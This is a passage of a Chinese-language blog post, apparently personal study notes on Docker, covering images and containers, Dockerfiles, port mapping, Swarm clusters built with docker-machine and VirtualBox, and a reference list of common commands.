href="#镜像和容器的区别" class="headerlink" title="镜像和容器的区别"></a>镜像和容器的区别</h4><p>容器和镜像的关系如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200723123056.png" alt=""></p><p><code>Dockerfile</code>用于定义镜像，依赖镜像来运行容器，仓库则是存放镜像的地方。</p><h4 id="Dockerfile-是什么？"><a href="#Dockerfile-是什么？" class="headerlink" title="Dockerfile 是什么？"></a>Dockerfile 是什么？</h4><p>Dockerfile 是一个创建Docker 镜像所需的文件，其中会包含一组指令来告诉Docker 如何构建我们的镜像。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ cat Dockerfile</span><br><span class="line"># 使用官方Python运行时作为父映像</span><br><span class="line">FROM python:2.7-slim</span><br><span class="line"></span><br><span class="line"># 将工作目录设置为&#x2F;app</span><br><span class="line">WORKDIR &#x2F;app</span><br><span class="line"></span><br><span class="line"># 将当前目录内容复制到容器at &#x2F;app</span><br><span class="line">COPY . &#x2F;app</span><br><span class="line"></span><br><span class="line"># 安装requirements.txt中指定的任何需要的包</span><br><span class="line">RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class="line"></span><br><span class="line"># #让80 端口号对外开放</span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line"># 定义环境变量</span><br><span class="line">ENV NAME World</span><br><span class="line"></span><br><span class="line"># 在容器启动时运行app.py</span><br><span class="line">CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure><h4 id="如何用镜像创建一个容器？"><a href="#如何用镜像创建一个容器？" class="headerlink" title="如何用镜像创建一个容器？"></a>如何用镜像创建一个容器？</h4><p>首先，我们需要一个镜像，然后才能创建容器。想要在Docker 上创建一个镜像，非常简单。</p><ol><li>cd 到项目文件夹中</li><li>使用 <code>docker build --tag=mydockerapp .</code> 命令，创建一个Docker 镜像。–tag 选项命名。</li><li>使用 <code>docker run -d -p 4000:80 mydockerapp</code>命令，创建一个新容器。</li></ol><p>该命令表示：Docker 以<code>mydockerapp</code>镜像创建一个新容器，同时以分离模式在后台运行该应用程序，将该容器的80端口映射到主机的4000端口。</p><p>其中：<br><code>-d</code>：让容器在后台运行<br><code>-p</code>：将容器内部端口映射到指定的主机端口上。<br><code>-P</code> :是容器内部端口随机映射到主机的端口上。</p><h4 id="Docker-网络端口映射"><a href="#Docker-网络端口映射" class="headerlink" title="Docker 网络端口映射"></a>Docker 网络端口映射</h4><p>使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -p 4000:80 mydocker</span><br></pre></td></tr></table></figure><p>然后用<code>docker container ls</code>查看容器列表</p><p>下图的意思表示：将该容器的端口80映射到4000，从而生成正确的URL <a href="http://localhost:4000。">http://localhost:4000。</a></p><p>Docker 开放了 80 端口映射到主机端口 4000 上。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200723123121.png" alt=""></p><h4 id="Docker-容器连接"><a href="#Docker-容器连接" class="headerlink" title="Docker 容器连接"></a>Docker 容器连接</h4><p>前面我们实现了通过网络端口来访问运行在 docker 容器内的服务。下面我们来实现通过端口连接到一个 docker 容器</p><h4 id="如何运行负载均衡应用？"><a href="#如何运行负载均衡应用？" class="headerlink" title="如何运行负载均衡应用？"></a>如何运行负载均衡应用？</h4><p>在开始之前，你得首先满足以下条件：</p><ol><li>安装Docker 1.13或更高版本。</li><li>了解如何创建容器。</li><li>确保已经创建镜像并发布到注册表。我们在这里需要使用该共享镜像。</li><li>确保镜像作为已部署的容器运行，并能访问。</li></ol><p>确保有<code>docker-compose.yml</code>配置文件，然后依次执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init</span><br><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br><span class="line"># 顺利的话，就能直接部署成功了。使用docker container ls 可以看到正在运行的实例。</span><br><span class="line"># 使用 curl http:&#x2F;&#x2F;localhost:4000 或者是刷新浏览器。</span><br><span class="line"># 无论以哪种方式，容器ID 都会发生变化。从而证明负载均衡成功。</span><br><span class="line"># 对于每个请求，以循环方式选择5个任务中的一个来响应。</span><br><span class="line"># 容器ID与上一个命令（docker container ls -q）的输出匹配。</span><br></pre></td></tr></table></figure><h4 id="关于服务"><a href="#关于服务" class="headerlink" title="关于服务"></a>关于服务</h4><p>在分布式应用程序中，应用程序的不同部分称为“服务”。例如，如果您想象一个视频共享站点，它可能包括一个用于在数据库中存储应用程序数据的服务，一个用户在上传内容后在后台进行视频转码的服务，一个用于前端的服务，等等。</p><p>服务实际上只是“生产中的容器”。服务只运行一个镜像，但它编码了镜像运行的方式 - 它应该使用哪些端口，应该运行多少个容器副本，以便服务具有所需的容量，以及等等。扩展服务会更改运行该软件的容器实例的数量，从而为流程中的服务分配更多计算资源。</p><p>在服务中运行的单个容器称为任务。任务被赋予以数字递增的唯一ID，最多为replicas您定义 的数量docker-compose.yml。</p><p>幸运的是，使用Docker平台定义，运行和扩展服务非常容易 - 只需编写一个docker-compose.yml文件即可。</p><h4 id="如何在Docker上安装-Docker-Machine？"><a href="#如何在Docker上安装-Docker-Machine？" class="headerlink" title="如何在Docker上安装 Docker Machine？"></a>如何在Docker上安装 Docker Machine？</h4><p>Ubuntu 18.04 请看文末的参考链接。</p><p>MacOS 如果是从<a href="https://hub.docker.com/" target="_blank" rel="noopener"><code>DockerHub</code>官网</a>下载的<code>dmg</code> 安装的Docker，不用担心，<code>Docker-Machine</code> 已经安装好了。</p><h4 id="如何安装VirtualBox？"><a href="#如何安装VirtualBox？" class="headerlink" title="如何安装VirtualBox？"></a>如何安装VirtualBox？</h4><p>Ubuntu 18.04 请看文末的参考链接。</p><p>MacOS 则需要从<a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener"><code>virtualbox</code>官网</a>下载dmg安装包。</p><p>你可能会遇到一个错误，参考解决：<a href="http://osxdaily.com/2018/12/31/install-run-virtualbox-macos-install-kernel-fails/" target="_blank" rel="noopener">如何在MacOS上安装VirtualBox</a></p><h3 id="了解Swarm集群"><a href="#了解Swarm集群" class="headerlink" title="了解Swarm集群"></a>了解Swarm集群</h3><p>群由多个节点组成，可以是物理或虚拟机。基本概念很简单：运行<code>docker swarm init</code>以启用<code>swarm模式</code>并使当前计算机成为一个<code>swarm管理器</code>。</p><p>这个章节是这个文档系列中学的时间最长的，坑有点多，走了不少弯路，这一节也挺重要的 重点记下笔记。</p><p>在MacOS 下，部分命令需要 sudo 权限。</p><h4 id="创建一个集群（本地计算机的VM）"><a href="#创建一个集群（本地计算机的VM）" class="headerlink" title="创建一个集群（本地计算机的VM）"></a>创建一个集群（本地计算机的VM）</h4><p>在开始这部分之前，需要提前安装好<code>Oracle VirtualBox</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine create --driver virutalbox myvm1</span><br></pre></td></tr></table></figure><p>如果你收到了这样的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ Error with pre-create check: </span><br><span class="line">&quot;VBoxManage not found. Make sure VirtualBox is installed and VBoxManage is in the path&quot;</span><br></pre></td></tr></table></figure><p>说明你的<code>Vritualbox</code>还是没有安装好。</p><p>查看正在运行的VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ls</span><br><span class="line">NAME    ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORS</span><br><span class="line">myvm1   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.104:2376           v17.06.2-ce</span><br><span class="line">myvm2   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.105:2376           v17.06.2-ce</span><br></pre></td></tr></table></figure><p>这样就成功的创建了一台VM，接下来我们要将这台机器作为管理器，第二台作为工作者。</p><p>另外值得一提的是，尽管我在Ubuntu 18.04 上分别安装好了docker-machine、virtualbox，但当我创建 VM 时，总是会提示我计算机没有开启什么虚拟化（BOIS）。</p><p>后来我大概想明白了，可能是我的那台服务器的配置太低了，真的是某个设置项没有启动导致的。</p><p>今天在MacBook 上重新操作了一边，异常顺利。</p><p>记录一个问题：使用<code>docker-machine create --driver virtualbox myvm1</code>创建VM时，创建成功了，但是并不是我想要的实例。得到了以下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(default) Creating a new host-only adapter produced an error: hostonlyif create failed:</span><br><span class="line">(default) 0%...</span><br><span class="line">(default) Progress state: E_FAIL</span><br><span class="line">(default) VBoxManage.exe: error: Failed to create the host-only adapter</span><br></pre></td></tr></table></figure><p>找了好久也没有找到答案，最后是怎么解决的呢？重启机器（加上 sudo）。</p><p>启动\停止 VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine start Name</span><br><span class="line">$ docker-machine stop Name</span><br></pre></td></tr></table></figure><h4 id="初始化Swarm-并添加节点"><a href="#初始化Swarm-并添加节点" class="headerlink" title="初始化Swarm 并添加节点"></a>初始化Swarm 并添加节点</h4><p>这里是一个小坑，之前在这里栽了好久。</p><p>这里有两种方式初始化节点或者说操作 VM（推荐第一种）：</p><ol><li><p>ssh 连接VM 实例，在Docker VM Cli 中执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;</span><br><span class="line"># &lt;myvm1 ip&gt; 指docker-machine ls 对应的 ip</span><br><span class="line"></span><br><span class="line"># 正常会得到这样一个输出</span><br><span class="line">To add a worker to this swarm, run the following command:</span><br><span class="line">   docker swarm join --token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo 192.168.99.103:2377</span><br></pre></td></tr></table></figure><h4 id="将myvm2-实例作为工作者加入（方式一）"><a href="#将myvm2-实例作为工作者加入（方式一）" class="headerlink" title="将myvm2 实例作为工作者加入（方式一）"></a>将myvm2 实例作为工作者加入（方式一）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker swarm join </span><br><span class="line">--token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo </span><br><span class="line">192.168.99.103:2377</span><br><span class="line"></span><br><span class="line"># 成功，会得到这样的输出</span><br><span class="line">This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure></li><li><p>直接通过 <code>docker-machine ssh myvm1</code> 执行相应命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1 &quot;docker swarm init --advertise-addr &lt;myvm1 ip&gt;&quot;</span><br><span class="line"># 同上</span><br></pre></td></tr></table></figure><h4 id="将myvm2-实例作为工作者加入（方式二）"><a href="#将myvm2-实例作为工作者加入（方式二）" class="headerlink" title="将myvm2 实例作为工作者加入（方式二）"></a>将myvm2 实例作为工作者加入（方式二）</h4><p>执行上面得到的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm2 &quot; docker swarm join </span><br><span class="line">--token SWMTKN-1-1j5rwl5kvffwtptdl79vw30zfgqd51hrda8xmrkmv0lnozjii4-0njs1rk0zdplj70wjk6uhmkfo </span><br><span class="line">192.168.99.103:2377&quot;</span><br><span class="line"></span><br><span class="line"># 成功，会得到这样的输出</span><br><span class="line">This node joined a swarm as a worker.</span><br></pre></td></tr></table></figure><p>这样，我们就成功的创建了一个集群，并将一个工作者作为一个节点加入了。</p></li></ol><h5 id="在管理器上查看集群中的节点："><a href="#在管理器上查看集群中的节点：" class="headerlink" title="在管理器上查看集群中的节点："></a>在管理器上查看集群中的节点：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker@myvm1: $ docker node ls</span><br><span class="line">ID                            HOSTNAME     STATUS       AVAILABILITY        MANAGER STATUS</span><br><span class="line">rihwohkh3ph38fhillhhb84sk *   myvm1        Ready        Active              Leader</span><br><span class="line">brtu9urxwfd5j0zrmkubhpkbd     myvm2        Ready        Active</span><br></pre></td></tr></table></figure><p>为什么上面要介绍那两种与 VM 实例进行交互的方式呢？</p><p>因为会和后面的在集群部署应用程序有一定联系。</p><h4 id="在集群中部署应用程序"><a href="#在集群中部署应用程序" class="headerlink" title="在集群中部署应用程序"></a>在集群中部署应用程序</h4><p>在开始部署之前，我们需要了解到有两种方式可以实现。</p><ol><li>docker-machine 为Swarm 管理器配置Shell</li></ol><p>到目前为止，我们与 VM 通信都是通过 <code>docker-machine ssh</code>这种方式，另一种更好的方式就是：将当前shell配置为与VM上的Docker守护程序通信。</p><p>这样我们就可以直接本地的<code>docker-compose.yml</code>文件远程部署应用程序，而无需将其复制到其他任何位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine env myvm1</span><br><span class="line">export DOCKER_TLS_VERIFY&#x3D;&quot;1&quot;</span><br><span class="line">export DOCKER_HOST&#x3D;&quot;tcp:&#x2F;&#x2F;192.168.99.100:2376&quot;</span><br><span class="line">export DOCKER_CERT_PATH&#x3D;&quot;&#x2F;Users&#x2F;sam&#x2F;.docker&#x2F;machine&#x2F;machines&#x2F;myvm1&quot;</span><br><span class="line">export DOCKER_MACHINE_NAME&#x3D;&quot;myvm1&quot;</span><br><span class="line"># Run this command to configure your shell:</span><br><span class="line"># eval $(docker-machine env myvm1)</span><br><span class="line"></span><br><span class="line"># 运行最后一行命令以配置与之通信的 shell </span><br><span class="line">$ eval $(docker-machine env myvm1) # eval $(sudodocker-machine env myvm1)</span><br></pre></td></tr></table></figure><p>运行docker-machine ls 已验证 myvm1 现在是活动的计算机。带有星号（*）表示配置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ls</span><br><span class="line">NAME    ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER        ERRORS</span><br><span class="line">myvm1   *        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.100:2376           v17.06.2-ce</span><br><span class="line">myvm2   -        virtualbox   Running   tcp:&#x2F;&#x2F;192.168.99.101:2376           v17.06.2-ce</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">docker-compose.yml</span><br><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br></pre></td></tr></table></figure><ol start="2"><li>传统方式</li></ol><p>传统的方式就是将<code>docker-compose.yml</code>文件拷贝到对应的管理器中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用scp 命令将文件拷贝到 vm 实例中</span><br><span class="line">$ ls</span><br><span class="line">docker-compose.yml</span><br><span class="line">$ docker-machine scp docker-compose.yml myvm1:~</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 这里就可以随意选择使用之前介绍的方式一或者方式二</span><br><span class="line"></span><br><span class="line"># 方式一</span><br><span class="line">$ docker-machine ssh myvm1 &quot;docker stack deploy -c docker-compose.yml getstartedlab&quot;</span><br><span class="line"></span><br><span class="line"># 方式二</span><br><span class="line">$ docker-machine ssh myvm1</span><br><span class="line">docker@myvm1: $ docker stack deploy -c docker-compose.yml</span><br></pre></td></tr></table></figure><p>耐心等待一会，就可以看到看到部署成功了。</p><h4 id="访问集群"><a href="#访问集群" class="headerlink" title="访问集群"></a>访问集群</h4><p>在访问集群之前，你需要知道以下两件事：</p><ul><li>访问集群的IP 地址是VM 的IP，使用<code>docker-machine ls</code>查看</li><li>是否存在端口号，取决于你的<code>docker-compose.yml</code>文件</li></ul><h2 id="Docker-常用命令"><a href="#Docker-常用命令" class="headerlink" title="Docker 常用命令"></a>Docker 常用命令</h2><h3 id="容器的生命周期"><a href="#容器的生命周期" class="headerlink" title="容器的生命周期"></a>容器的生命周期</h3><p>创建一个新的容器并运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span><br><span class="line">$ docker run ubuntu:15.10 &#x2F;bin&#x2F;echo &quot;Hello world&quot;</span><br><span class="line"># 解释：Docker以ubuntu15.10镜像创建一个新容器，然后在容器里执行 bin&#x2F;echo &quot;Hello world&quot;，最后输出结果。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">* -d：让容器在后台运行</span><br><span class="line">* -p：内部容器绑定到指定的主机端口上</span><br><span class="line">* -P：内部容器端口随机映射到主机端口上</span><br><span class="line">* --name：给容器命名，如果不加--name 参数，Docker 会自动命名。</span><br></pre></td></tr></table></figure><p>杀掉一个运行中的容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker kill -s KILL mydocker</span><br><span class="line"># mydocker 表示Contianer ID或者Name</span><br></pre></td></tr></table></figure><p>结束停止一个运行中的容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker container stop mydocker</span><br><span class="line"># mydocker 表示Container ID或者Name</span><br></pre></td></tr></table></figure><p>查看正在运行的容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">* -l：查询最后一次创建容器记录</span><br><span class="line">* --all：查询所有创建容器记录</span><br><span class="line">* -aq：查询所有创建容器的Container ID</span><br></pre></td></tr></table></figure><p>停止Web 应用容器</p><p>这个只是停止该容器的运行，并没有杀死</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop mydocker</span><br></pre></td></tr></table></figure><p>启动Web 应用容器</p><p>已经停止的容器，可以使用命令 docker start 来启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker start mydocker</span><br></pre></td></tr></table></figure><p>移除Web 应用容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker rm mydocker</span><br><span class="line">mydocker</span><br><span class="line"># 删除容器时，容器必须是停止状态，否者会报错。</span><br></pre></td></tr></table></figure><h3 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h3><p>如何创建一个Docker 镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build --tag&#x3D;mydockerapp # 注意：标签名只能小写</span><br></pre></td></tr></table></figure><p>列出下载到计算机中的镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ docker image ls</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">hello-world         latest              fce289e99eb9        3 months ago        1.84kB</span><br><span class="line"></span><br><span class="line">各个选项说明:</span><br><span class="line">* REPOSITORY：表示镜像的仓库源</span><br><span class="line">* TAG：镜像的标签</span><br><span class="line">* IMAGE ID：镜像ID</span><br><span class="line">* CREATED：镜像创建时间</span><br><span class="line">* SIZE：镜像大小</span><br></pre></td></tr></table></figure><p>查找镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker search nginx </span><br><span class="line">NAME     DESCRIPTION                    STARS      OFFICIAL </span><br><span class="line">nginx    Official build of Nginx.       11154        [OK]</span><br><span class="line"></span><br><span class="line">NAME:镜像仓库源的名称</span><br><span class="line"></span><br><span class="line">DESCRIPTION:镜像的描述</span><br><span class="line"></span><br><span class="line">OFFICIAL:是否docker官方发布</span><br></pre></td></tr></table></figure><p>获取一个新镜像</p><p>如果我们决定使用上图中的 nginx 官方镜像，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull nginx</span><br></pre></td></tr></table></figure><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><p>列出下载到计算机中的 container </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker container ls</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br></pre></td></tr></table></figure><h3 id="仓库操作"><a href="#仓库操作" class="headerlink" title="仓库操作"></a>仓库操作</h3><p>登入<code>hub.docker.com</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker login </span><br><span class="line"># 前提是先注册号账号</span><br></pre></td></tr></table></figure><p>标记镜像，以便上传至目标位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker tag mydocker aikang&#x2F;get-started:part1</span><br><span class="line"># 最后上传至所登入的Docker Hub仓库</span><br></pre></td></tr></table></figure><p>将标记的镜像上传到存储库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker push mydocker aikang&#x2F;get-started:part1</span><br></pre></td></tr></table></figure><p>从远程存储库中拉出并运行映像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d -p 4000:80 aikang&#x2F;get-started:part1</span><br></pre></td></tr></table></figure><p>注意：无论在哪里执行<code>docker run</code>，它都会提取你的镜像，以及Python和所有依赖项requirements.txt，并运行你的代码。它们都在一个整洁的小包中一起旅行，你不需要在主机上安装任何东西让Docker运行它。</p><h3 id="服务操作"><a href="#服务操作" class="headerlink" title="服务操作"></a>服务操作</h3><p>群集初始化，可以使节点变成群集管理器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init</span><br></pre></td></tr></table></figure><p>以服务运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack deploy -c docker-compose.yml getstartedlab</span><br><span class="line">Creating network getstartedlab_webnet</span><br><span class="line">Creating service getstartedlab_web</span><br><span class="line"># 需要有一个docker-compose.yml 文件</span><br></pre></td></tr></table></figure><p>列出与应用程序关联的正在运行的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker service ls</span><br></pre></td></tr></table></figure><p>查看与堆栈相关的所有服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack services getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure><p>列出服务任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker service ps getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure><p>关闭服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack rm getstartedlab</span><br><span class="line"># getstartedlab 表示服务的Names</span><br></pre></td></tr></table></figure><p>查看集群中的节点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker node ls</span><br></pre></td></tr></table></figure><h3 id="VM-交互"><a href="#VM-交互" class="headerlink" title="VM 交互"></a>VM 交互</h3><p>创建一个VM 实例（Win、Mac、Linux）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine create --driver virtualbox myvm1</span><br></pre></td></tr></table></figure><p>使用ssh 连接VM 实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine ssh myvm1</span><br></pre></td></tr></table></figure><p>查看关于节点的基本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine env myvm1</span><br></pre></td></tr></table></figure><p>使用scp命令将本地文件copy到VM实例中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine scp &lt;filename&gt; myvm1:~  </span><br><span class="line"># 从当前目录拷贝到实例中的根目录下</span><br></pre></td></tr></table></figure><p>删除指定VM</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-machine rm myvm1</span><br></pre></td></tr></table></figure><p>将Shell 与VM 连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eval $(docker-machine env myvm1)</span><br></pre></td></tr></table></figure><p>将Shell 与VM 断开，使用本地连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eval $(docker-machine env -u)</span><br></pre></td></tr></table></figure><h3 id="集群操作"><a href="#集群操作" class="headerlink" title="集群操作"></a>集群操作</h3><p>以下操作均需要在VM CLI 中运行</p><p>初始化集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm init --advertise-addr &lt;myvm1 ip&gt;</span><br></pre></td></tr></table></figure><p>将节点加入集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm join --token &lt;token&gt; &lt;ip&gt;:2377&quot;</span><br></pre></td></tr></table></figure><p>让工作者离开集群</p><figure class="highlight 